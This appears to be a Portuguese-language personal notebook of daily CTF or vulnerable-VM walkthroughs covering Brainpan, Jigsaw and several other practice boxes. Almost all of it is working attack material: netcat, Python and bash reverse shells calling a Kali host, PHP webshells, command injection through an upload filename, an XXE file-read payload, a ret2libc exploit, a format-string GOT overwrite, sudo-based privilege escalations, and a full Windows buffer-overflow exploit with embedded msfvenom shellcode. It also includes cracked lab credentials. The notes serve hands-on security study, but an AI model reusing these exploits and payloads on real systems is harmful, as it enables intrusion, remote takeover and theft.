		find / -perm  -u=s -type f 2>&-
		##/usr/local/Serv-U/Serv-U  
		
			#kali: searchsploit -m 47009
				python -m SimpleHTTPServer 8080
			
		wget http:/192.168.100.22:8080/47009.c
		gcc 47009.c -o beco21
		./beco21
		 root


<h3>Dia 22 			28/9/2020</h3>

	*scan
		-sV -p-
		
		#searchploit vsftpd 
		
		*dirb
			http://ip_vm 
			
			http://ip_vm/robots.txt
				curl -H "User-Agent: GoogleBot" http://ip_vm/robots.txt
					ip/secret_information
					http://192.168.100.28/secret_information/?lang=es.php
						http://192.168.100.28/secret_information/?lang=/etc/vsftpd.conf
							anon_root=/var/ftp/
	*cd /tmp
		ftp ip_vm
		user: anonymous
		pass: 
			cd pub
			kali: cp /usr/share/webshells/php/php-reverse-shell.php /tmp ; mv /tmp/php-reverse-shell.php beco22.php ; nano beco22.php 
				alterar o ip e porta
				nc -lnvp 443
				
			ftp: put beco22.php
				browser: http://192.168.100.28/secret_information/?lang=/var/ftp/pub/beco22.php
				
		* nc
			find / -perm -u=s -type f 2>&-
						#/home/tom/rootshell
						cd /home/tom
						
						cat rootshell.c
							
							
			cd /tmp
			echo 'printf "tom"' > whoami ; chmod 777 whoami
				cat whoami
				./whoami
				
				export PATH=/tmp:$PATH
				
				whoami
				
				cd /home/tom
				./rootshell



<h3>Dia 23 			29/9/2020</h3>

	http://ipvm/robots.txt
		http://ipvm/sar2HTML/index.php?plot=LINUX
			http://ipvm/sar2HTML/index.php?plot=;uname -a
			
	*msfvenom -p cmd/unix/reverse_netcat lhost=kali lport=443 -f raw | beco23.sh
	
	*python3 -m http.server
	http://ipvm/sar2HTML/index.php?plot=;wget http://ipkali:8000/beco23.sh
	http://ipvm/sar2HTML/index.php?plot=;chmod +x beco23.sh
	kali: nc -lnvp 443
	http://ipvm/sar2HTML/index.php?plot=;sh beco23.sh

	*nc
		wget http://ipkali:8000/pspy-master
		chmod +x pspy-master
		./pspy-master
		
			#usr/bin/cron -f ....
				./finally.sh 
				./write.sh
			
			
			cat beco23.sh ->  mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa echo "mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa
			
			
		echo "mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa echo "mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa" >> ../write.sh
		#sair do nc e esperar nova conexão
		
		kali: nc -lnvp 443
			
		root



<h3>Dia 24 			30/9/2020</h3>

	*browser
	#LFI
		http://192.168.100.30/view.php?page=tools.html
			http://192.168.100.30/view.php?page=../../../../../../../../etc/passwd
	
	*dirb
		ip/dbadmin
			test_db_admin.php
			pass: admin
			
			*table: test_users -> table info
			http://192.168.100.30/dbadmin/test_db.php?action=row_view&table=info
			decode pass MD5
				crackstation 
					root: 34kroot34
					zico: zico2215@
				
		create new database
		beco24.php
		criar tabela, 1 coluna
			name: xx
			type text
			kali: msfvenom -p cmd/unix/reverse_netcat lport=443 lhost=ipkali -f raw
			VALUE: <?php exec("mkfifo /tmp/gmifjwk; nc 10.0.2.4 443 0</tmp/gmifjwk | /bin/sh >/tmp/gmifjwk 2>&1; rm /tmp/gmifjwk");?>
			
		*nc lnvp 443
		http://192.168.100.30/view.php?page=../../../../../../../../usr/databases/beco.php
		

		cd /home/zico/wordpress
		cat wp-config.php
			/** The name of the database for WordPress */
			define('DB_NAME', 'zico');

			/** MySQL database username */
			define('DB_USER', 'zico');

			/** MySQL database password */
			define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

			/** MySQL hostname */
			define('DB_HOST', 'zico');
			
		*ssh zico@ip
		pass: sWfCsfJSPV9H3AmQzw8
		
		sudo -l
		
		cd /tmp
		
		#TAR
		touch file
		sudo /bin/tar -c -f /tmp/file . --checkpoint=1 --checkpoint-action=exec='sudo su'
		
		~root
		
		#ZIP
		touch beco24
		sudo zip /tmp/beco24.zip /tmp/beco24 -T --unzip-command="sh -c /bin/bash"




<h3>Dia 25 			1/10/2020</h3>

	*scan -A -p- ip
	
	*smb
		smbclient -L //ip_vm
			users
		smbclient //ip_vm/sambashare
			sem senha	
			
			get mailsent.txt
			
		*browser: ip/8000
			/admin
			
			user: daisa@photographer.com
			pass: babygirl
			
			echo '<?php system($_GET['cmd']);?>' > image.php.jpg
			import content			
				*burp
					image.php.jpg
						retirar o .jpg
					
			content
				selecione o da data atual
					download file -> copie o link 
						exemplo: http://192.168.100.31:8000/storage/originals/9a/96/image.php
						
						*http://192.168.100.31:8000/storage/originals/9a/96/image.php?cmd=whereis%20python
						
			*nc -lnvp 443
			http://192.168.100.31:8000/storage/originals/9a/96/image.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

			find / -perm -u=s 2>&-
				#/usr/bin/php7.2
				
				CMD="/bin/sh"
				/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
			
				root


<h3>Dia 26 			2/10/2020</h3>

	*browser -> ip_vm
		menu -> upload
			*burp
			upload!
				------WebKitFormBoundary5YBXXbBFZisCAb4E
				Content-Disposition: form-data; name="file"; filename=""
				Content-Type: application/octet-stream

					*filename="testebeco.txt; cat main*"
					
					#info: b232a4da4c104798be4613ab76d26efda1a04606 
							  someuser
					
					converter ip_kali para long decimal
						https://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx
						
						kali: nc -lnvp 443
						
						filename="testebeco.txt; nc decimal_ip 443 -e sh"
							filename="testebeco.txt; nc 3232261142 443 -e sh"
						
				*nc
					python -c 'import pty;pty.spawn("/bin/bash")' 
					
					cat /root/message.txt
					
					cat /etc/resolv.conf
						#mofo.pwn
						
					netstat -antp
						#172.19.0.10...
						
						
						fazer um scan na rede interno hosts/ports
						ip descobertos	
							172.19.0.1
								22-80-8080
							172.19.0.10
								80
							172.19.0.12
								21
							172.19.0.100	
								53
						
						
						*lftp someuser@172.19.0.12
							b232a4da4c104798be4613ab76d26efda1a04606
							
							cat cmscreds.txt
								#hardEnough4u
							
						
						*dig axfr mofo.pwn -> transferencia de zona -> instalar dig na máquina
							#ourcms.mofo.pwn
							#
							
							
	
						kali:
						 cd /tmp
						mknod backpipe p 
							nc -lvp 9091 0<backpipe|nc -lvp  9090 |tee backpipe
							
						*nc: 
						cd /tmp
						mknod backpipe p 
						nc 172.19.0.1 8080 0<backpipe|nc ip_kali 9091 |tee backpipe
						
						kali 					->				host			-> alvo interno
					porta local 9090	->---|                       -> 	
					tunelamento 9091	->    |------------------ ->	 porta 8080
	
	
					
				
					kali: nano /etc/hosts
						ip_kali 	ourcms.mofo.pwn
						


						ip_kali:9090						
						http://ourcms.mofo.pwn:9090/admin
						
							admin
							hardEnough4u
	
					
					*ourCMS
						Theme		
							<?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/192.168.100.22/4040 0>&1’");?>
							save
							editing file: xxx
							
							*kali: nc -nlvp 4040
							ourcms.pwn:9090/theme/Innovation/template.php
													
							*kali-------------
								*sudo wireshark
									#MDSN							
							
							 responder -I eth1 
							user: channa
							pass: 
							-------------------
							
							su channa
							pass:  
							
							cd /var/mail
							cat channa
								genna:9t4lw0r82rg1
								
							su genna
							9t4lw0r82rg1
												
								sudo -l
									#cpulimit							
									
									sudo cpulimit -l 100 -f /bin/sh
									root




<h3>Dia 27 			3/10/2020</h3>

	*scan defaul
		#31337 werkzeug
		#dirb ip_vm
			ip:31337/.ssh/id_rsa
			ip:31337/.ssh/id_rsa.pub
			
		*ssh
			locate ssh2john
				python ssh2john.py id_rsa > passSSH
				john passSSH
				
				*ssh simon@ip_vm
				starwars
			
			#cat /root/read_message.c

				/home/simon/read_message
					name: Simon
					
					*BufferOverflaw
					#python3 -c "print('Simon','\x00'*45)" | read_message

					read_message
					SimonAAAAAAAAAAAAAAA/bin/sh
					
					root




<h3>Dia 28 			4/10/2020</h3>


apt intall gdb

	*tcpdump -A -n host ip_vm and not arp -i eth2 -vv
		#j19s4w	
	
		*nc -u ip_vm 666
		
			root@kali:/home/kali/Desktop# nc -u 192.168.100.35 666
			j19s4w
				ZmxhZzF7MzAzNGNjMjkyN2I1OWUwYjIwNjk2MjQxZjE0ZDU3M2V9CllvdSBjb21wbGV0ZWQgeW91ciBmaXJzdCB0ZXN0LiBOb3cga25vY2sgdGhlc2UgbnVtYmVycyB0byBmaW5kIHdoYXQgeW91IHNlZWsuIDU1MDAgNjYwMCA3NzAw
				echo 'string_cima' | base64 -d
					flag1{3034cc2927b59e0b20696241f14d573e}


				python -c 'print "j19s4w" ' | nc -u 192.168.100.35 666 | base64 -d
					#knock 192.168.100.35 5500 6600 7700
						##apt install knockd
					
					
			#browser ip_vm
			wget http://ip_vm/jigsaw.gif
			
			*strings jigsaw.gif
				#/w4n770p14y494m3
				
				#browser
					ip_vm/w4n770p14y494m3
					
		
		*burp
			http://192.168.100.35/w4n770p14y494m3/		
				view-page source
					function XLMFunction
					##falha XXE
					*burp
						email:xx
						senha:xx
						
						<!DOCTYPE beco28 [<!ELEMENT batata ANY> <!ENTITY lapada SYSTEM "file:///etc/passwd">]>
						email: &lapada;
						password: nulo-vazio
						
						<!DOCTYPE beco28 [<!ELEMENT batata ANY> <!ENTITY lapada SYSTEM "file:///etc/knockd.conf">]>
							#[openSSH] sequence    = 7011,8011,9011
							
							*knock -v ip_vm 7011 8011 9011
						
		*ssh jigsaw@192.168.100.35
			pass: j19s4w
			
			find / -perm -u=s 2>&-
				/bin/game3
				file /bin/game3
					/bin/game3 xxxxxx.........
						segmentation fault			
				
		kali: scp jigsaw@192.168.100.35:/bin/game3 .
			pass: j19s4w
		
							
			gdb game3
				run
				pattern_create 100
					[string]
				run [string]		
				
				pattern_offset [EIP]
				#76
				
			*ssh_vm:			OBS:"os valores podem variar!	/ acrescente o 0x" 
				ldd /bin/game3
					libc -> 0xb755b000 
						 minha_vm -> 0xb7522000
				
				readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system			
					system@@ -> 0x00040310
						 minha_vm -> 0x00040310
		
				readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
					exit@@ -> 0x00033260
						 minha_vm -> 0x00033260
					
					strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep bin/sh
					 shell -> 0x00162d4c
						 minha_vm -> 162d4c -> 0x00162d4c
					
				kali:
					nano beco28.py
					import struct
					buf = "A" * 76
					buf += struct.pack("<1", 0x12345678)
					print buf
					
					
				*gbd -> apt intall gdb
					run `python beco28.py
						EIP -> 0x12345678
						
				*vim xpl28.py
					from subprocess import call
					import struct
					
					libc = 0xb7522000
					system_ = struct.pack("<I",libc + 0x00040310)
					exit_ = struct.pack("<I", libc + 0x00033260)
					shell = struct.pack("<I", libc + 0x00162d4c )
					
					buf = "A"*76
					buf +=  system_
					buf += exit_
					buf += shell
					
					for i in range(0,512):
						print('testando'+ str(buf))
						a =call(["/bin/game3", buf])
						
					copiar, colar e executar na vm_alvo
					
					vm_alvo: python beco28.py
						root





<h3>Dia 29 			5/10/2020</h3>

	apt-get install gcc-multilib
	apt-get install g++-multilib

	*scan nmap 
	
	*dirb http://192.168.100.36:8088  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php
	
		#submit.php
		#codereview.php -> https://gist.github.com/0xabe-io/916cf3af33d1c0592a90 -> shell reverse.c -> modificar ip
		
	*nc -lnvp 8081
	*submit codereview
		
		*nc
		
			python -c 'import pty;pty.spawn("/bin/bash")'
			
			python -c 'print("1\n1\n" + "AAAA" + "%8$x")' | ./my_first
			
			./my_first
				gdb ./my_first     (dados podem variar! não copie)
				break __libc_start_main
				run
				print system
					# 0xb75eb060
					    0xb75de060
				quit
				
			*objdump -R my_first		
				 #printf OFFSET -> 0x08049bfc
				
			*	ulimit -s
					ulimit -s unlimited
					ulimit -s
					
					
				python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "%8$n")' > beco29payload
					
				*gdb my_first
				r < beco29payload
					#0x00000004				
				print system
					#0x40069060
					
			kali: python -c 'print 0x9060-0x0004'
				#36956
				
				vm: python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "%36956u" +"%8$n")' > beco29payload
				gdb ./my_first
				
				run < beco29payload
					#0x00009060
			
				converter printf OFFSET para decimal -> https://www.rapidtables.com/convert/number/decimal-to-hex.html -> from hexadecimal to decimal
					#Decimal number: 134519804
					
					SWAP
						decimal -> hexadecima	= 134519806	
						 #8049BFE
						
						
					kali: python -c 'print  0x14006-0x9060'
						#44966
						
						
				python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "\xfe\x9b\x04\x08" + "%36952u" + "%8$n" + "%44966u"  + "%9$n" )' > beco29payload
				
				gdb ./my_first
				
				run < beco29payload
					# sh: 1: Selection:: not found 
					
					
					
				kali: msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.22 lport=443 -f raw
					mkfifo /tmp/nhlhf; nc 192.168.100.22 443 0</tmp/nhlhf | /bin/sh >/tmp/nhlhf 2>&1; rm /tmp/nhlhf > Selection\:       ↔  modifique ip e porta se precisar
					
				vm: /home/mike
				echo "mkfifo /tmp/nhlhf; nc 192.168.100.22 443 0</tmp/nhlhf | /bin/sh >/tmp/nhlhf 2>&1; rm /tmp/nhlhf" > Selection\: 
				chmod +x Selection\:
				chmod 777 Selection\:
				
				export PATH=$PATH:/tmp
				
				cat $PATH 
					...../tmp
					
				*kali:  nc -lnvp 443		
				
				*vm: python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "\xfe\x9b\x04\x08" + "%36952u" + "%8$n" + "%44966u"  + "%9$n" )'  | ./my_first				
						ERROS: chmod (Selection\:)  /  ulimit -s   / #PATH
								
				
				*nc 
					cd /home/john
					cd .ssh
					
						kali: cd ~/.ssh
							ssh-keygen -t rsa -C john
							johnkey
							sem senha -> ENTER
							
							cat johnkey.pub
								#mandar para o authorized_keys da vm
									echo "asdasd" > authorized_keys
									chmod 600 authorized_keys
									
					kali: ssh -i johnkey john@192.168.100.36
					
					sudo -l
						#/usr/local/sbin/nfs
						sudo  /usr/local/sbin/nfs start
						
						kali: nmap -sV --script=nfs-showmount 192.168.100.36    ////  showmount -e 192.168.100.36
						
						cd /tmp
						mkdir beco29
						mount -t nfs 192.168.100.36:/opt/nfs beco29
						cd beco29
						
						kali:
						
						nano  xpl.c
						#include <stdlib.h>
						
						int main() {
       					system("/bin/bash"); }
							
							gcc xpl.c -o becoxpl  -m32
							
							cp becoxpl beco29
							chmod 4777  becoxpl
						
						vm_ssh:
							cd /opt/nfs
							./becoxpl
							 
							root





<h3>Dia 30 			6/10/2020</h3>

	*instalar o https://www.immunityinc.com/products/debugger/ na vm  windows ->  vm windows 7/10 microsoft
	*desativar firewall windows




	*dirb http://192.168.100.37:10000/
		#bin
			download brainpan.exe 	↔  mandar para wind (use pasta compartilhada)
			executar o brain
			
			kali: nc ip_vm 9999
			confirmado a conexão, pode fechar e iniciar o Immunity Debugger
			
			*open brainpan.exe
				*teclado - F9
				
			kali: nano fuzz-brain.py  (ATENÇÃO À INDENTAÇÃO)
			
			import socket

			buffer=["A"]
			c=100

			while len(buffer) < 25:
					buffer.append("A"*c)
					c=c+200

			for a in buffer:
					print("[+] Testando: " + str(len(a)) + " bytes")
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.connect(("192.168.100.38",9999))
					s.send(a + "\r\n")
					
					
				*kali: locate pattern_create
					#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100
				
				nano xpl.py
				
				joga na variavel buffer
				
				import socket

				buffer="resultado_pattern_aqui"

				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				s.connect(("192.168.100.38",9999))
				s.send(buffer)
				
				
			*Immunity Debugger
				Ctrl+F2
				F9
							
			kali: python xpl.py

			*Immunity Debugger
				#EIP: 35724134 
				
			kali: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
				#524   ---IMPORTANTE

			*Immunity Debugger		
			menu-> e 
				1° opção - name: brainpan
					entrar nele ^^^^^
						Ctrl+F
						find comand
							#JMP ESP
							# 311712F3   ---IMPORTANTE

	------------------------------------
			kali: nano xpl.py
			
				import socket
				#524
				#311712F3 -> \xf3\x12\x17\x31


				buffer="A"* 524 + "\xf3\x12\x17\x31" * 4 + "C" * 400

				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				s.connect(("192.168.100.38",9999))
				s.send(buffer)
				
				
					
	--------------------------------

			kali: msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.22 lport=443 exitfunc=thread -f python -a x86 -b "\x00"
								
			nano xpl.py
			
			import socket

			buf =  b""
			buf += b"\xd9\xc5\xbf\xc9\x82\x5c\x87\xd9\x74\x24\xf4\x5d\x2b"
			buf += b"\xc9\xb1\x52\x31\x7d\x17\x03\x7d\x17\x83\x24\x7e\xbe"
			buf += b"\x72\x4a\x97\xbd\x7d\xb2\x68\xa2\xf4\x57\x59\xe2\x63"
			buf += b"\x1c\xca\xd2\xe0\x70\xe7\x99\xa5\x60\x7c\xef\x61\x87"
			buf += b"\x35\x5a\x54\xa6\xc6\xf7\xa4\xa9\x44\x0a\xf9\x09\x74"
			buf += b"\xc5\x0c\x48\xb1\x38\xfc\x18\x6a\x36\x53\x8c\x1f\x02"
			buf += b"\x68\x27\x53\x82\xe8\xd4\x24\xa5\xd9\x4b\x3e\xfc\xf9"
			buf += b"\x6a\x93\x74\xb0\x74\xf0\xb1\x0a\x0f\xc2\x4e\x8d\xd9"
			buf += b"\x1a\xae\x22\x24\x93\x5d\x3a\x61\x14\xbe\x49\x9b\x66"
			buf += b"\x43\x4a\x58\x14\x9f\xdf\x7a\xbe\x54\x47\xa6\x3e\xb8"
			buf += b"\x1e\x2d\x4c\x75\x54\x69\x51\x88\xb9\x02\x6d\x01\x3c"
			buf += b"\xc4\xe7\x51\x1b\xc0\xac\x02\x02\x51\x09\xe4\x3b\x81"
			buf += b"\xf2\x59\x9e\xca\x1f\x8d\x93\x91\x77\x62\x9e\x29\x88"
			buf += b"\xec\xa9\x5a\xba\xb3\x01\xf4\xf6\x3c\x8c\x03\xf8\x16"
			buf += b"\x68\x9b\x07\x99\x89\xb2\xc3\xcd\xd9\xac\xe2\x6d\xb2"
			buf += b"\x2c\x0a\xb8\x15\x7c\xa4\x13\xd6\x2c\x04\xc4\xbe\x26"
			buf += b"\x8b\x3b\xde\x49\x41\x54\x75\xb0\x02\x9b\x22\xde\xc4"
			buf += b"\x73\x31\x1e\xe8\x38\xbc\xf8\x80\x2e\xe9\x53\x3d\xd6"
			buf += b"\xb0\x2f\xdc\x17\x6f\x4a\xde\x9c\x9c\xab\x91\x54\xe8"
			buf += b"\xbf\x46\x95\xa7\x9d\xc1\xaa\x1d\x89\x8e\x39\xfa\x49"
			buf += b"\xd8\x21\x55\x1e\x8d\x94\xac\xca\x23\x8e\x06\xe8\xb9"
			buf += b"\x56\x60\xa8\x65\xab\x6f\x31\xeb\x97\x4b\x21\x35\x17"
			buf += b"\xd0\x15\xe9\x4e\x8e\xc3\x4f\x39\x60\xbd\x19\x96\x2a"
			buf += b"\x29\xdf\xd4\xec\x2f\xe0\x30\x9b\xcf\x51\xed\xda\xf0"
			buf += b"\x5e\x79\xeb\x89\x82\x19\x14\x40\x07\x39\xf7\x40\x72"
			buf += b"\xd2\xae\x01\x3f\xbf\x50\xfc\x7c\xc6\xd2\xf4\xfc\x3d"
			buf += b"\xca\x7d\xf8\x7a\x4c\x6e\x70\x12\x39\x90\x27\x13\x68"

			#524
			#311712F3 -> \xf3\x12\x17\x31


			buffer="A"*524 + "\xf3\x12\x17\x31" + "\x90" * 8 + buf

			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(("192.168.100.38",9999))
			s.send(buffer)
			
			
			
			*windows -> pode fechar o Immunity Debugger
				*abrir o brainpan.exe
				
				kali: nc 192.168.100.38 9999
				
					python xpl.py
	
			*Agora, executar na VM ALVO Brainpan
			
				kali: msfconsole
				use multi/handler
				set payload linux/x86/shell/reverse_tcp
				
				python xpl.py
			
			python -c 'import pty;pty.spawn("/bin/bash")'
			sudo -l 
			#/home/anansi/bin/ananci_util
			sudo /home/anansi/bin/ananci_util  manual file
			!/bin/bash
			cat /root/b.txt
